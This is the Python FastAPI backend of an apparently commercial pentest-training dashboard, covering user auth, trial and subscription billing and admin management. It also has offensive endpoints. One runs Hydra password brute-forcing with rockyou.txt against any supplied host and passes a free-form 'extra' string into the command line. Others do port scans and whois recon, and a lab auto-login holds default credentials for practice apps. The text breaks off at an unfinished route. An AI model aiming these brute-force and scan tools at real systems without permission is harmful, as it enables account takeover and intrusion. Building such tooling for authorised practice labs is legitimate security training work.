# ══════════════════════════════════════════════════════════════
#  OSCP DASHBOARD — COMPLETE BACKEND
#  Run: python3 -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
# ══════════════════════════════════════════════════════════════

from fastapi import FastAPI, Depends, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, List
import subprocess, asyncio, re, json, uuid, datetime, os, ssl as _ssl_lib, socket as _socket_lib, time as _time, itertools as _itertools, sqlite3
import jwt as _jwt, bcrypt as _bcrypt
from urllib.parse import urlparse
from contextvars import ContextVar
_AUTH_CTX: ContextVar = ContextVar('auth_req', default=None)
_USER_CTX: ContextVar = ContextVar('user_id', default="anonymous")

JWT_SECRET = os.getenv("JWT_SECRET")
if not JWT_SECRET:
    raise RuntimeError("JWT_SECRET environment variable is required and must not be empty.")
DB_PATH = os.getenv("DB_PATH", "/app/data/users.db")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")  # required on first init only
CORS_ORIGINS = [o.strip() for o in os.getenv(
    "CORS_ORIGINS",
    "https://app.vulnuslab.com,https://vulnuslab.com,http://localhost:3000"
).split(",") if o.strip()]
# Lemon Squeezy — for subscription payments. All optional; checkout endpoint returns 503 if not set.
LEMONSQUEEZY_API_KEY    = os.getenv("LEMONSQUEEZY_API_KEY", "")
LEMONSQUEEZY_STORE_ID   = os.getenv("LEMONSQUEEZY_STORE_ID", "")
LEMONSQUEEZY_VARIANT_ID = os.getenv("LEMONSQUEEZY_VARIANT_ID", "")
LEMONSQUEEZY_WEBHOOK_SECRET = os.getenv("LEMONSQUEEZY_WEBHOOK_SECRET", "")
# Trial / billing config
TRIAL_DAYS = int(os.getenv("TRIAL_DAYS", "7"))
GRACE_DAYS = int(os.getenv("GRACE_DAYS", "3"))  # extra full-access days after trial expires

def _get_db():
    con = sqlite3.connect(DB_PATH, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")
    con.row_factory = sqlite3.Row
    return con

def _init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    con = _get_db()
    con.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            plan TEXT DEFAULT 'trial',
            created_at TEXT NOT NULL,
            expires_at TEXT DEFAULT NULL,
            status TEXT DEFAULT 'active',
            phone TEXT DEFAULT NULL,
            note TEXT DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS renewal_log (
            id TEXT PRIMARY KEY,
            user_id TEXT NOT NULL,
            action TEXT NOT NULL,
            done_by TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            note TEXT DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS scans (
            id TEXT PRIMARY KEY,
            user_id TEXT NOT NULL,
            tool TEXT,
            target TEXT,
            summary TEXT,
            timestamp TEXT
        );
    """)
    # Migrate existing DBs — add new columns if missing.
    # Each statement is hardcoded (no f-string interpolation) to avoid SQL identifier injection patterns.
    for stmt in [
        "ALTER TABLE users ADD COLUMN expires_at TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'",
        "ALTER TABLE users ADD COLUMN phone TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN note TEXT DEFAULT NULL",
        # Subscription / billing columns
        "ALTER TABLE users ADD COLUMN trial_started_at TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN trial_expires_at TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN subscription_id TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN subscription_status TEXT DEFAULT NULL",
        "ALTER TABLE users ADD COLUMN subscription_renews_at TEXT DEFAULT NULL",
    ]:
        try: con.execute(stmt)
        except sqlite3.OperationalError: pass
    con.commit()
    now = datetime.datetime.utcnow().isoformat()
    # Seed ADMIN superuser only on first init, only if ADMIN_PASSWORD env var is set.
    existing = con.execute("SELECT id FROM users WHERE username='ADMIN'").fetchone()
    if not existing:
        if ADMIN_PASSWORD:
            superadmin_id = str(uuid.uuid4())
            pw_hash = _bcrypt.hashpw(ADMIN_PASSWORD.encode(), _bcrypt.gensalt()).decode()
            con.execute("INSERT INTO users (id,username,email,password_hash,plan,created_at,status) VALUES (?,?,?,?,?,?,?)",
                (superadmin_id, "ADMIN", "admin@cyber.dev", pw_hash, "superadmin", now, "active"))
            con.commit()
        # else: skip — admin must be created out-of-band via a managed deployment step
    con.close()

_init_db()

app = FastAPI(title="OSCP Dashboard API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security = HTTPBearer(auto_error=False)

def _today_str():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d")

def _scans_today(user_id: str) -> int:
    try:
        con = _get_db()
        count = con.execute(
            "SELECT COUNT(*) FROM scans WHERE user_id=? AND timestamp LIKE ?",
            (user_id, _today_str()+"%")).fetchone()[0]
        con.close()
        return count
    except: return 0

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials:
        raise HTTPException(status_code=401, detail="No token provided")
    try:
        payload = _jwt.decode(credentials.credentials, JWT_SECRET, algorithms=["HS256"])
        uid = payload.get("user_id", "anonymous")
        if payload.get("username") != "ADMIN":
            con = _get_db()
            row = con.execute("SELECT status, expires_at, plan FROM users WHERE id=?", (uid,)).fetchone()
            con.close()
            if row:
                if row["status"] == "suspended":
                    raise HTTPException(status_code=403, detail="Account suspended. Contact support.")
                if row["expires_at"]:
                    exp = datetime.datetime.fromisoformat(row["expires_at"])
                    if datetime.datetime.utcnow() > exp and row["plan"] not in ("superadmin","pro_lifetime"):
                        raise HTTPException(status_code=403, detail="Subscription expired. Please renew to continue.")
        _USER_CTX.set(uid)
        return payload
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid or expired token")

async def verify_scan_quota(user=Depends(verify_token)):
    """Check daily scan limit for trial users AND block expired trials with no subscription."""
    if user.get("username") == "ADMIN": return user
    uid = user.get("user_id","anonymous")
    # Block users whose trial + grace period is exhausted (no active subscription)
    info = _get_billing_status(uid)
    if info.get("access") == "expired":
        raise HTTPException(status_code=402,
            detail="Trial expired. Subscribe to VulnusLab Pro to continue.")
    # Pro users have unlimited scans
    if info.get("access") == "pro": return user
    # Trial / grace users still have daily limit
    used = _scans_today(uid)
    if used >= TRIAL_SCANS_DAY:
        raise HTTPException(status_code=429,
            detail=f"Daily scan limit reached ({TRIAL_SCANS_DAY} scans/day on trial). Upgrade to Pro for unlimited scans.")
    return user

@app.get("/api/trial/status")
async def trial_status(user=Depends(verify_token)):
    """Returns trial info: days left, scans used today, limit."""
    uid  = user.get("user_id","anonymous")
    plan = user.get("plan","trial")
    con  = _get_db()
    row  = con.execute("SELECT expires_at FROM users WHERE id=?", (uid,)).fetchone()
    con.close()
    used = _scans_today(uid)
    days_left = None
    if row and row["expires_at"]:
        exp = datetime.datetime.fromisoformat(row["expires_at"])
        days_left = max(0, (exp - datetime.datetime.utcnow()).days)
    return {
        "plan": plan,
        "is_trial": plan == "trial",
        "days_left": days_left,
        "scans_today": used,
        "daily_limit": TRIAL_SCANS_DAY if plan=="trial" else None,
        "scans_remaining": max(0, TRIAL_SCANS_DAY - used) if plan=="trial" else None,
    }

class ScanRequest(BaseModel):
    target: str
    api_key: Optional[str] = None
    auth_cookie: Optional[str] = None       # e.g. "PHPSESSID=abc123; token=xyz"
    auth_bearer: Optional[str] = None       # e.g. "eyJhbGci..."
    wordlist: Optional[List[str]] = None    # custom paths for gobuster/ffuf

def _make_req_headers(req=None):
    """Merge browser headers with optional auth from ScanRequest or context."""
    h = dict(_BROWSER_HEADERS)
    auth = req or _AUTH_CTX.get()
    if auth:
        if getattr(auth, 'auth_cookie', None):
            h['Cookie'] = auth.auth_cookie
        if getattr(auth, 'auth_bearer', None):
            h['Authorization'] = f'Bearer {auth.auth_bearer}'
    return h

def save_scan(scan_id, tool, target, result):
    user_id = _USER_CTX.get()
    ts = datetime.datetime.utcnow().isoformat()
    summary = result.get("output","")[:200]
    try:
        con = _get_db()
        con.execute("INSERT OR IGNORE INTO scans VALUES (?,?,?,?,?,?)",
                    (scan_id, user_id, tool, target, summary, ts))
        con.commit(); con.close()
    except Exception:
        pass

async def run_tool(cmd, timeout=60):
    cmd_str = " ".join(str(c) for c in cmd)
    try:
        proc = await asyncio.create_subprocess_exec(
            *[str(c) for c in cmd],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {"output": out.decode("utf-8", errors="replace"), "cmd": cmd_str}
        except asyncio.TimeoutError:
            try: proc.kill()
            except: pass
            return {"output": f"[Timeout after {timeout}s]", "cmd": cmd_str, "error": "timeout"}
    except Exception as e:
        return {"output": "", "cmd": cmd_str, "error": str(e)}


# ── AUTH ──────────────────────────────────────────────────────
class LoginRequest(BaseModel):
    username: str
    password: str

class RegisterRequest(BaseModel):
    username: str
    email: str
    password: str

def _make_jwt(user_id: str, username: str, plan: str) -> str:
    payload = {
        "user_id": user_id,
        "username": username,
        "plan": plan,
        "exp": datetime.datetime.utcnow() + datetime.timedelta(days=30),
    }
    return _jwt.encode(payload, JWT_SECRET, algorithm="HS256")

TRIAL_DAYS       = 7
TRIAL_SCANS_DAY  = 50  # 50 tool calls = ~1 full scan session per day

@app.post("/api/auth/register")
async def register(req: RegisterRequest):
    if len(req.username) < 3:
        raise HTTPException(status_code=400, detail="Username must be at least 3 characters")
    if len(req.password) < 6:
        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
    user_id  = str(uuid.uuid4())
    pw_hash  = _bcrypt.hashpw(req.password.encode(), _bcrypt.gensalt()).decode()
    now      = datetime.datetime.utcnow()
    now_iso  = now.isoformat()
    trial_exp = (now + datetime.timedelta(days=TRIAL_DAYS)).isoformat()
    try:
        con = _get_db()
        con.execute(
            "INSERT INTO users (id,username,email,password_hash,plan,created_at,expires_at,status,trial_started_at,trial_expires_at) VALUES (?,?,?,?,?,?,?,?,?,?)",
            (user_id, req.username, req.email, pw_hash, "trial", now_iso, trial_exp, "active", now_iso, trial_exp))
        con.commit(); con.close()
    except sqlite3.IntegrityError:
        raise HTTPException(status_code=409, detail="Username or email already exists")
    token = _make_jwt(user_id, req.username, "trial")
    return {"access_token": token, "username": req.username, "plan": "trial", "role": "user",
            "trial_expires": trial_exp, "trial_days": TRIAL_DAYS, "daily_scan_limit": TRIAL_SCANS_DAY}

@app.post("/api/auth/login")
async def login(req: LoginRequest):
    con = _get_db()
    row = con.execute("SELECT * FROM users WHERE username=?", (req.username,)).fetchone()
    con.close()
    if not row:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    if not _bcrypt.checkpw(req.password.encode(), row["password_hash"].encode()):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    role = "superadmin" if row["username"] == "ADMIN" else ("admin" if row["username"] == "admin" else "user")
    token = _make_jwt(row["id"], row["username"], row["plan"])
    return {"access_token": token, "username": row["username"], "plan": row["plan"], "role": role}

@app.get("/api/auth/me")
async def me(user=Depends(verify_token)):
    # Enrich with billing status so the frontend can render the trial banner / upgrade button
    uid = user["user_id"]
    info = _get_billing_status(uid)
    return {
        "user_id": uid,
        "username": user["username"],
        "plan": user.get("plan","trial"),
        **info,
    }

# ─── Billing / subscription helpers ──────────────────────────────
def _get_billing_status(user_id: str) -> dict:
    """Returns access state for a user: pro / trial / grace / expired / unknown.

    - pro: paid subscription is active
    - trial: within initial trial window
    - grace: trial expired but within GRACE_DAYS — full access + warning banner
    - expired: trial + grace exhausted, no subscription — read-only / locked
    """
    try:
        con = _get_db()
        row = con.execute(
            "SELECT username, plan, trial_started_at, trial_expires_at, subscription_status, subscription_renews_at FROM users WHERE id=?",
            (user_id,)
        ).fetchone()
        con.close()
    except Exception:
        return {"access": "unknown"}
    if not row:
        return {"access": "unknown"}
    # Superadmin / admin always have full access
    if row["username"] in ("ADMIN", "admin") or row["plan"] in ("superadmin", "admin"):
        return {"access": "pro", "plan_label": "superadmin"}
    # Paid subscription
    if (row["subscription_status"] or "").lower() in ("active", "on_trial", "past_due"):
        return {
            "access": "pro",
            "plan_label": "pro",
            "subscription_status": row["subscription_status"],
            "subscription_renews_at": row["subscription_renews_at"],
        }
    # Trial / grace logic
    trial_exp_str = row["trial_expires_at"]
    if not trial_exp_str:
        return {"access": "trial", "plan_label": "trial", "trial_days_remaining": TRIAL_DAYS}
    try:
        trial_exp = datetime.datetime.fromisoformat(trial_exp_str)
    except Exception:
        return {"access": "trial", "plan_label": "trial"}
    now = datetime.datetime.utcnow()
    grace_end = trial_exp + datetime.timedelta(days=GRACE_DAYS)
    if now < trial_exp:
        days = max(0, int((trial_exp - now).total_seconds() // 86400))
        return {"access": "trial", "plan_label": "trial",
                "trial_expires_at": trial_exp_str, "trial_days_remaining": days}
    if now < grace_end:
        days = max(0, int((grace_end - now).total_seconds() // 86400))
        return {"access": "grace", "plan_label": "trial",
                "trial_expires_at": trial_exp_str, "grace_days_remaining": days}
    return {"access": "expired", "plan_label": "expired",
            "trial_expires_at": trial_exp_str}


def _require_active_access(user_id: str):
    """Raises 402 Payment Required if user has no active access (trial expired + grace exhausted, no subscription)."""
    info = _get_billing_status(user_id)
    if info.get("access") == "expired":
        raise HTTPException(status_code=402, detail="Trial expired. Please subscribe to continue.")


# ─── Lemon Squeezy: checkout + webhook ──────────────────────────
class _CheckoutReq(BaseModel):
    redirect_url: Optional[str] = None  # where to send user after purchase (defaults to dashboard)


@app.post("/api/billing/checkout")
async def create_checkout(req: _CheckoutReq, user=Depends(verify_token)):
    """Create a Lemon Squeezy checkout URL for the current user. Returns {url: ...}."""
    if not (LEMONSQUEEZY_API_KEY and LEMONSQUEEZY_STORE_ID and LEMONSQUEEZY_VARIANT_ID):
        raise HTTPException(status_code=503, detail="Payments are not configured yet. Contact support@vulnuslab.com.")
    # Fetch user email so checkout pre-fills it and we can match webhook → user
    con = _get_db()
    row = con.execute("SELECT email, username FROM users WHERE id=?", (user["user_id"],)).fetchone()
    con.close()
    if not row:
        raise HTTPException(status_code=404, detail="User not found")
    redirect = req.redirect_url or "https://app.vulnuslab.com/?billing=success"
    payload = {
        "data": {
            "type": "checkouts",
            "attributes": {
                "checkout_data": {
                    "email": row["email"],
                    "name": row["username"],
                    "custom": {"user_id": user["user_id"]},  # echoed back in webhooks
                },
                "product_options": {
                    "redirect_url": redirect,
                    "receipt_button_text": "Return to VulnusLab",
                    "receipt_thank_you_note": "Thank you for subscribing to VulnusLab Pro!",
                },
            },
            "relationships": {
                "store":           {"data": {"type": "stores",           "id": str(LEMONSQUEEZY_STORE_ID)}},
                "variant":         {"data": {"type": "variants",         "id": str(LEMONSQUEEZY_VARIANT_ID)}},
            },
        }
    }
    import requests as _rq
    try:
        r = _rq.post(
            "https://api.lemonsqueezy.com/v1/checkouts",
            json=payload,
            headers={
                "Authorization": f"Bearer {LEMONSQUEEZY_API_KEY}",
                "Accept":        "application/vnd.api+json",
                "Content-Type":  "application/vnd.api+json",
            },
            timeout=15,
        )
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Could not reach Lemon Squeezy: {e}")
    if r.status_code >= 400:
        raise HTTPException(status_code=502, detail=f"Lemon Squeezy error: {r.text[:300]}")
    data = r.json()
    url = data.get("data", {}).get("attributes", {}).get("url")
    if not url:
        raise HTTPException(status_code=502, detail="Lemon Squeezy did not return a checkout URL")
    return {"url": url}


@app.post("/api/webhooks/lemonsqueezy")
async def lemonsqueezy_webhook(request: Request):
    """Receive subscription events from Lemon Squeezy and update the user's billing status.

    LS sends events like:
      - subscription_created
      - subscription_updated
      - subscription_cancelled
      - subscription_resumed
      - subscription_expired
      - subscription_payment_success
      - subscription_payment_failed
    """
    raw = await request.body()
    sig = request.headers.get("x-signature", "")
    if not LEMONSQUEEZY_WEBHOOK_SECRET:
        raise HTTPException(status_code=503, detail="Webhook secret not configured")
    import hmac, hashlib
    expected = hmac.new(LEMONSQUEEZY_WEBHOOK_SECRET.encode(), raw, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, sig):
        raise HTTPException(status_code=403, detail="Invalid signature")
    try:
        body = json.loads(raw)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON")

    event_name = body.get("meta", {}).get("event_name", "")
    custom = body.get("meta", {}).get("custom_data", {}) or {}
    user_id = custom.get("user_id")
    attrs = body.get("data", {}).get("attributes", {}) or {}
    sub_id = body.get("data", {}).get("id") or attrs.get("subscription_id")
    status = attrs.get("status", "")  # active, cancelled, expired, on_trial, past_due, unpaid
    renews_at = attrs.get("renews_at")

    if not user_id:
        # Fall back to matching by email if custom data wasn't carried through
        email = attrs.get("user_email")
        if email:
            con = _get_db()
            row = con.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()
            con.close()
            if row:
                user_id = row["id"]
    if not user_id:
        return {"ok": True, "ignored": "no user_id and email not matched"}

    # Translate event → new state
    if event_name in ("subscription_created", "subscription_resumed", "subscription_payment_success"):
        new_status = "active"
        new_plan = "pro"
    elif event_name == "subscription_updated":
        new_status = status or "active"
        new_plan = "pro" if new_status in ("active", "on_trial") else "trial"
    elif event_name in ("subscription_cancelled", "subscription_expired"):
        new_status = status or "cancelled"
        new_plan = "trial"  # they can still access until renews_at; access logic handles grace
    elif event_name == "subscription_payment_failed":
        new_status = "past_due"
        new_plan = "pro"  # keep access while we retry
    else:
        new_status = status
        new_plan = None

    con = _get_db()
    if new_plan:
        con.execute(
            "UPDATE users SET subscription_id=?, subscription_status=?, subscription_renews_at=?, plan=? WHERE id=?",
            (str(sub_id) if sub_id else None, new_status, renews_at, new_plan, user_id),
        )
    else:
        con.execute(
            "UPDATE users SET subscription_id=?, subscription_status=?, subscription_renews_at=? WHERE id=?",
            (str(sub_id) if sub_id else None, new_status, renews_at, user_id),
        )
    con.commit(); con.close()
    return {"ok": True, "event": event_name, "user_id": user_id, "status": new_status}


@app.get("/api/billing/status")
async def billing_status(user=Depends(verify_token)):
    return _get_billing_status(user["user_id"])


@app.post("/api/lab/autologin")
async def lab_autologin(body: dict, user=Depends(verify_token)):
    lab = body.get("lab", "")
    labs = {
        "dvwa": {
            "url":    "http://lab_dvwa/dvwa/login.php",
            "data":   {"username":"admin","password":"password","Login":"Login"},
            "extra":  "security=low",
            "check":  "logout",
        },
        "bwapp": {
            "url":    "http://lab_bwapp/bWAPP/login.php",
            "data":   {"login":"bee","password":"bug","security_level":"0","form":"submit"},
            "extra":  "security_level=0",
            "check":  "logout",
        },
        "mutillidae": {
            "url":    "http://lab_mutillidae/mutillidae/index.php?page=login.php",
            "data":   {"username":"admin","password":"adminpass","login-php-submit-button":"Login"},
            "extra":  "",
            "check":  "logout",
        },
        "webgoat": {
            "url":    "http://lab_webgoat:8080/WebGoat/login",
            "data":   {"username":"guest","password":"guest"},
            "extra":  "",
            "check":  "WebGoat",
        },
    }
    if lab not in labs:
        raise HTTPException(status_code=400, detail=f"Unknown lab: {lab}")
    cfg = labs[lab]
    try:
        s = _req_lib.Session()
        r = s.post(cfg["url"], data=cfg["data"], timeout=10, verify=False, allow_redirects=True)
        cookies = s.cookies.get_dict()
        if not cookies:
            cookies = {k: v for k, v in r.cookies.items()}
        if not cookies:
            return {"ok": False, "error": "No session cookie returned — login may have failed"}
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        if cfg["extra"]:
            cookie_str += "; " + cfg["extra"]
        logged_in = cfg["check"].lower() in r.text.lower() or r.status_code == 200
        return {"ok": logged_in, "cookie": cookie_str, "lab": lab}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@app.get("/api/health")
async def health():
    python_tools = ["port_scanner","web_fuzzer","sqli_engine","ssl_analyzer",
                    "dns_enum","whois_lookup","waf_detector","cms_detector",
                    "xss_scanner","subdomain_enum","username_osint","dnstwist"]
    free_tools = {t: {"available": True, "cost": "FREE", "type": "python"} for t in python_tools}
    msf = await run_tool(["which", "msfconsole"], timeout=5)
    free_tools["metasploit"] = {"available": bool(msf.get("output","").strip()), "cost": "FREE", "type": "kali"}
    free_tools["netcat"]     = {"available": True, "cost": "FREE", "type": "kali"}
    return {
        "status": "ok",
        "version": "3.0.0",
        "architecture": "hybrid-python",
        "free_tools": free_tools,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

@app.post("/api/tools/status")
@app.get("/api/tools/status")
async def tools_status(user=Depends(verify_token)):
    python_tools = ["port_scanner","web_fuzzer","sqli_engine","ssl_analyzer",
                    "dns_enum","waf_detector","cms_detector","xss_scanner",
                    "subdomain_enum","username_osint","dnstwist","nikto_equiv"]
    status = {t: "python-native" for t in python_tools}
    msf = await run_tool(["which", "msfconsole"], timeout=5)
    status["metasploit"] = "installed" if msf.get("output","").strip() else "missing"
    status["netcat"] = "installed"
    return {"status": status, "timestamp": datetime.datetime.utcnow().isoformat()}

@app.get("/api/history")
async def get_history(user=Depends(verify_token)):
    uid = user.get("user_id", "anonymous")
    is_superadmin = user.get("username") == "ADMIN"
    try:
        con = _get_db()
        if is_superadmin:
            rows = con.execute("SELECT * FROM scans ORDER BY timestamp DESC LIMIT 500").fetchall()
        else:
            rows = con.execute("SELECT * FROM scans WHERE user_id=? ORDER BY timestamp DESC LIMIT 100", (uid,)).fetchall()
        con.close()
        return {"history": [dict(r) for r in rows]}
    except Exception:
        return {"history": []}

@app.get("/api/scans")
async def get_scans(user=Depends(verify_token)):
    uid = user.get("user_id", "anonymous")
    is_superadmin = user.get("username") == "ADMIN"
    try:
        con = _get_db()
        if is_superadmin:
            rows = con.execute("SELECT * FROM scans ORDER BY timestamp DESC LIMIT 500").fetchall()
        else:
            rows = con.execute("SELECT * FROM scans WHERE user_id=? ORDER BY timestamp DESC LIMIT 100", (uid,)).fetchall()
        con.close()
        scans = [dict(r) for r in rows]
        return {"scans": scans, "total": len(scans)}
    except Exception:
        return {"scans": [], "total": 0}

def _admin_only(user):
    if user.get("username") != "ADMIN":
        raise HTTPException(status_code=403, detail="Superadmin only")

@app.get("/api/admin/users")
async def admin_get_users(user=Depends(verify_token)):
    _admin_only(user)
    con = _get_db()
    rows = con.execute("""
        SELECT u.id, u.username, u.email, u.plan, u.created_at, u.expires_at,
               u.status, u.phone, u.note,
               COUNT(s.id) as scan_count
        FROM users u LEFT JOIN scans s ON s.user_id = u.id
        GROUP BY u.id ORDER BY u.created_at DESC
    """).fetchall()
    con.close()
    now = datetime.datetime.utcnow()
    result = []
    for r in rows:
        d = dict(r)
        if d["expires_at"]:
            exp = datetime.datetime.fromisoformat(d["expires_at"])
            days_left = (exp - now).days
            d["days_left"] = days_left
            d["expiry_status"] = "expired" if days_left < 0 else "expiring_soon" if days_left <= 7 else "active"
        else:
            d["days_left"] = None
            d["expiry_status"] = "no_expiry"
        result.append(d)
    return {"users": result, "total": len(result)}

@app.post("/api/admin/users/{username}/extend")
async def admin_extend_subscription(username: str, body: dict, user=Depends(verify_token)):
    _admin_only(user)
    days = int(body.get("days", 30))
    plan = body.get("plan", None)
    note = body.get("note", "")
    con = _get_db()
    row = con.execute("SELECT id, expires_at, plan FROM users WHERE username=?", (username,)).fetchone()
    if not row: raise HTTPException(status_code=404, detail="User not found")
    now = datetime.datetime.utcnow()
    base = max(now, datetime.datetime.fromisoformat(row["expires_at"])) if row["expires_at"] and datetime.datetime.fromisoformat(row["expires_at"]) > now else now
    new_exp = (base + datetime.timedelta(days=days)).isoformat()
    new_plan = plan or row["plan"]
    con.execute("UPDATE users SET expires_at=?, status='active', plan=? WHERE username=?", (new_exp, new_plan, username))
    log_id = str(uuid.uuid4())
    con.execute("INSERT INTO renewal_log VALUES (?,?,?,?,?,?)",
        (log_id, row["id"], f"Extended {days} days → {new_exp}", "ADMIN", now.isoformat(), note))
    con.commit(); con.close()
    return {"ok": True, "username": username, "expires_at": new_exp, "plan": new_plan}

@app.post("/api/admin/users/{username}/plan")
async def admin_change_plan(username: str, body: dict, user=Depends(verify_token)):
    _admin_only(user)
    plan = body.get("plan")
    if not plan: raise HTTPException(status_code=400, detail="plan required")
    con = _get_db()
    con.execute("UPDATE users SET plan=? WHERE username=?", (plan, username))
    con.commit(); con.close()
    return {"ok": True, "username": username, "plan": plan}

@app.post("/api/admin/users/{username}/suspend")
async def admin_suspend_user(username: str, user=Depends(verify_token)):
    _admin_only(user)
    if username == "ADMIN": raise HTTPException(status_code=400, detail="Cannot suspend superadmin")
    con = _get_db()
    con.execute("UPDATE users SET status='suspended' WHERE username=?", (username,))
    con.commit(); con.close()
    return {"ok": True, "username": username, "status": "suspended"}

@app.post("/api/admin/users/{username}/activate")
async def admin_activate_user(username: str, user=Depends(verify_token)):
    _admin_only(user)
    con = _get_db()
    con.execute("UPDATE users SET status='active' WHERE username=?", (username,))
    con.commit(); con.close()
    return {"ok": True, "username": username, "status": "active"}

@app.delete("/api/admin/users/{username}")
async def admin_delete_user(username: str, user=Depends(verify_token)):
    _admin_only(user)
    if username == "ADMIN": raise HTTPException(status_code=400, detail="Cannot delete superadmin")
    con = _get_db()
    con.execute("DELETE FROM users WHERE username=?", (username,))
    con.commit(); con.close()
    return {"ok": True, "deleted": username}

@app.get("/api/admin/renewals")
async def admin_renewal_log(user=Depends(verify_token)):
    _admin_only(user)
    con = _get_db()
    rows = con.execute("SELECT r.*, u.username FROM renewal_log r JOIN users u ON u.id=r.user_id ORDER BY r.timestamp DESC LIMIT 100").fetchall()
    con.close()
    return {"log": [dict(r) for r in rows]}


# ── PASSWORD ATTACKS — HYDRA ──────────────────────────────────
class HydraRequest(BaseModel):
    target:   str
    service:  str = "http-post-form"
    username: str = ""
    userlist: str = ""
    passlist: str = "/usr/share/wordlists/rockyou.txt"
    port:     str = ""
    extra:    str = ""

@app.post("/api/password/hydra")
async def password_hydra(req: HydraRequest, user=Depends(verify_token)):
    cmd = ["hydra"]
    if req.username:
        cmd += ["-l", req.username]
    elif req.userlist:
        cmd += ["-L", req.userlist]
    else:
        cmd += ["-l", "admin"]
    cmd += ["-P", req.passlist]
    if req.port:
        cmd += ["-s", req.port]
    cmd += ["-t", "4", "-f", "-V", "-w", "5", "-W", "3"]
    if req.extra:
        cmd += req.extra.split()
    parsed = urlparse(req.target if req.target.startswith("http") else "http://"+req.target)
    host = parsed.hostname or req.target
    cmd += [host, req.service]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        if "[" in line and "] login:" in line.lower():
            found.append(line.strip())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "hydra", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "service": req.service,
        "credentials_found": found, "total": len(found),
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  RECON MODULE
# ══════════════════════════════════════════════════════════════

def _recon_host(target: str) -> str:
    t = target.strip()
    if t.startswith("http://") or t.startswith("https://"):
        return urlparse(t).hostname or t
    return t.split("/")[0].strip()

def _web_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = "http://" + t
    return t

def _is_external(target: str) -> bool:
    host = _recon_host(target)
    return not any(x in host for x in ["lab_","localhost","127.","192.168.","10.","172.20.","0.0.0.0"])

_BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}


@app.post("/api/recon/whois")
async def recon_whois(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    w = await loop.run_in_executor(None, _whois_query, host)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "whois", req.target, {"output": w.get("raw","")})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "whois",
        "registrar": w.get("registrar"), "created": w.get("created"),
        "expires": w.get("expires"), "updated": w.get("updated"),
        "registrant": None, "country": None,
        "name_servers": w.get("name_servers",[]),
        "raw_output": w.get("raw",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/nmap")
async def recon_nmap(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    ports = await _tcp_scan(host)
    banners = await _banner_grab(host)
    banner = next(iter(banners.values()), None)
    out = "\n".join(f"{p['port']}/tcp open {p['service']} {p['version']}" for p in ports)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "nmap", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "nmap",
        "ports": ports, "total_open": len(ports),
        "banner": banner, "os_guess": None,
        "raw_output": out, "command": "python _tcp_scan",
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/masscan")
async def recon_masscan(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    open_ports = await _tcp_scan(host)
    ports = [{"port":p["port"],"proto":p["proto"],"host":host} for p in open_ports]
    out = "\n".join(f"Discovered open port {p['port']}/tcp on {host}" for p in open_ports)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "masscan", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "masscan",
        "ports": sorted(ports, key=lambda x:x["port"]),
        "total_open": len(ports), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dns")
